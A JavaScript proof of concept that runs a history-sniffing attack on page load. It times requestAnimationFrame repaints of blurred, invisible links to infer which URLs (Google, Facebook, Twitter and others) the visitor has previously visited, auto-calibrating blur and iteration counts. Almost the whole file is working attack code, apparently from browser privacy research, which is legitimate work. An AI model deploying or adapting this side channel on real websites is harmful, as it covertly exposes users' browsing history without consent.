"use strict";

const NEVER_VISITED =
  "http://address-you-must-have-never-visited-before:100000";
const NEVER_VISITED2 =
  "http://address-you-must-have-never-visited-before:200000";
const LINKS = [
  location.href,
  "https://www.google.com",
  "https://www.facebook.com",
  "https://twitter.com",
  "https://twitter.com/upsuperx",
  "https://bugzilla.mozilla.org",
  "https://hg.mozilla.org/releases/mozilla-aurora/rev/2a94d540599e",
];

const test_area = document.getElementById('test-area');
const test_links = test_area.children;

function initTestArea(num) {
  var count = num / Math.pow(window.devicePixelRatio, 2);
  // We create count links
  for (var i = 0; i < count; i++) {
    var a = document.createElement('a');
    a.appendChild(document.createTextNode(' ### ### ###'));
    test_area.appendChild(a);
  }
}

function setTestAreaLink(link) {
  for (var i = 0; i < test_links.length; i++) {
    test_links[i].href = link;
  }
}

function requestAnimationFrames(callbacks) {
  if (callbacks.length > 0) {
    requestAnimationFrame(function(t){
      callbacks.shift()(t);
      requestAnimationFrames(callbacks);
    });
  }
}

function EMPTY_LOOP(){}
function checkOnePass(link) {
  return new Promise(function(resolve, reject){
    var timestamps = [];
    function getCallback(link, log_time) {
      return function(t){
        if (log_time){
          timestamps.push(t);
        }
        setTestAreaLink(link);
      };
    }
    var callbacks;
    callbacks = [
    getCallback(NEVER_VISITED, false),
    getCallback(link, true),
    getCallback(NEVER_VISITED, true),
    function(t){
        timestamps.push(t);
        resolve({
          test: [timestamps[1] - timestamps[0],
                timestamps[2] - timestamps[1]],
        });
      }
    ];
    requestAnimationFrames(callbacks);
  });
}
function computeMedian(series) {
  var sorted = series.slice(0);
  sorted.sort();
  var median_index = Math.floor(sorted.length / 2);
  if (median_index * 2 != sorted.length) {
    return sorted[median_index];
  } else {
    return (sorted[median_index - 1] + sorted[median_index]) / 2;
  }
}
function examineTimeSeries(test_series, base_series) {
  var test_median = computeMedian(test_series);
  var base_median = computeMedian(base_series);
  return test_median > base_median * 1.1;
}

function checkIsLinkVisited(link, nbIter, base_series) {
  return new Promise(function(resolve, reject){
    var test_series = [];
    var promise = Promise.resolve();
    for (var i = 0; i < nbIter; i++) {
      promise = promise
        .then(function(){
          return checkOnePass(link);
        })
        .then(function(times){
          test_series.push(...times.test);
        });
    }
    promise.then(function(){
      var visited = examineTimeSeries(test_series, base_series);
      resolve({ visited, test_series, base_series });
    });
  });
}

function runNonVisited(nbIter){
    return new Promise(function(resolve, reject){
      var base_series = [];
      var promise = Promise.resolve();
      for (var i = 0; i < nbIter; i++) {
        promise = promise
          .then(function(){
              return new Promise(function(resolve, reject){
                  var timestamps = [];
                  function getCallback(link, log_time) {
                      return function(t){
                          if (log_time){
                          timestamps.push(t);
                          }
                          setTestAreaLink(link);
                      };
                  }
                  var callbacks;
                  callbacks = [
                      getCallback(NEVER_VISITED, true), 
                      getCallback(NEVER_VISITED2, true),
                      getCallback(NEVER_VISITED, true),
                      function(t){
                        timestamps.push(t);
                        resolve({
                            base: [timestamps[1] - timestamps[0],
                                timestamps[2] - timestamps[1]]
                        });
                      }
                  ];
                  requestAnimationFrames(callbacks);
              });
          }).then(function(times){
              base_series.push(...times.base);
          });
      }
      promise.then(function(){
        resolve(base_series);
      });
    });
}

function runVisited(nbIter){
    return new Promise(function(resolve, reject){
      var base_series = [];
      var promise = Promise.resolve();
      for (var i = 0; i < nbIter; i++) {
        promise = promise
          .then(function(){
              return new Promise(function(resolve, reject){
                  var timestamps = [];
                  function getCallback(link, log_time) {
                      return function(t){
                          if (log_time){
                          timestamps.push(t);
                          }
                          setTestAreaLink(link);
                      };
                  }
                  var callbacks;
                  callbacks = [
                    getCallback(NEVER_VISITED, false),
                    getCallback(LINKS[0], true),
                    getCallback(NEVER_VISITED, true),
                    function(t){
                        timestamps.push(t);
                        resolve({
                          test: [timestamps[1] - timestamps[0],
                                timestamps[2] - timestamps[1]],
                        });
                      }
                    ];
                  requestAnimationFrames(callbacks);
              });
          }).then(function(times){
              base_series.push(...times.test);
          });
      }
      promise.then(function(){
        resolve(base_series);
      });
    });
}

function listTimes(time_series) {
  return time_series.map(t => Math.round(t)).join(', ');
}
function generateDetails(result) {
  var ul = document.createElement('ul');
  ul.className = 'details';
  var test = document.createElement('li');
  var base = document.createElement('li');
  test.appendChild(document.createTextNode(`test: ${listTimes(result.test_series)}`));
  base.appendChild(document.createTextNode(`base: ${listTimes(result.base_series)}`));
  ul.appendChild(test);
  ul.appendChild(base);
  return ul;
}

const links = document.getElementById('links');
window.onload = () => {
  initTestArea(250);
  var promise = Promise.resolve();
  var calibrate = true;
  var base_series = [];
  var non_visited_series = [];
  var visited_series = [];
  var nbIter = 2;
  var timeRequired = [];
  var testAreaElt = document.getElementById("test-area");
  function optimizeParameters(promiseCondition, nbIter, blurPx){
      return new Promise(function(resolve, reject){
        var start;
        console.log("Iteration: "+nbIter);
        if(nbIter == 0){
          return reject("0iter");
        }

        testAreaElt.style.filter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%)";
        testAreaElt.style.webkitFilter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%);";
        promiseCondition.then(function(){
          start = performance.now();
          return runNonVisited(nbIter);
        })
        .then(function(result){
          console.log("Non visited website");
          console.log(result);
          non_visited_series = result;
          return Promise.resolve();
        }).then(function(res){
          return runVisited(nbIter);
        }).then(function(result){
          console.log("Visited website");
          console.log(result);
          visited_series = result;
          var validated = examineTimeSeries(visited_series, non_visited_series);
          return Promise.resolve(validated);
        }).then(function(result){
          console.log("Result: "+result);
          timeRequired.push(performance.now()-start);
          console.log(timeRequired);
          if(result){
            optimizeParameters(Promise.resolve(), --nbIter, blurPx-5).then(function(res){
              var resParameters = {
                nbIter: res.nbIter,
                blur: res.blur,
                non_visited_series: res.non_visited_series
              }
              return resolve(resParameters);
            }, function(res){
              var resParameters = {
                nbIter: nbIter,
                blur: blurPx,
                non_visited_series: non_visited_series
              }
              return resolve(resParameters);
            });
          } else{
            return reject("Should not be there ?");
          }
        }).catch(function(err){
          console.log(err);
          return resolve("An exception occured");
        });
    });
  }

  var p1 = optimizeParameters(Promise.resolve(), 3, 30);
  p1.then(function(optimizedParameters){
    console.log(optimizedParameters);
    var blurPx = optimizedParameters.blur;
    // var blurPx = 12;
    //We set the filter with the optimal value
    testAreaElt.style.filter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%)";
    testAreaElt.style.webkitFilter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%);";
    // We shouldn't have to do +1, fix this !
    var nbIter = optimizedParameters.nbIter+1;
    // LINKS.forEach(function(link){
    url_visited.forEach(function(link){
        promise = promise
          .then(function(){
            return checkIsLinkVisited(link, nbIter, optimizedParameters.non_visited_series);
          })
          .then(function(result){
            var li = document.createElement('li');
            li.className = result.visited ? 'visited' : 'unvisited';
            var a = document.createElement('a');
            a.href = link;
            a.appendChild(document.createTextNode(link));
            li.appendChild(a);
            li.appendChild(generateDetails(result));
            links.appendChild(li);
          });
      });

  }, function(optimizedParameters){
    console.log("Promise rejected");
  });
};
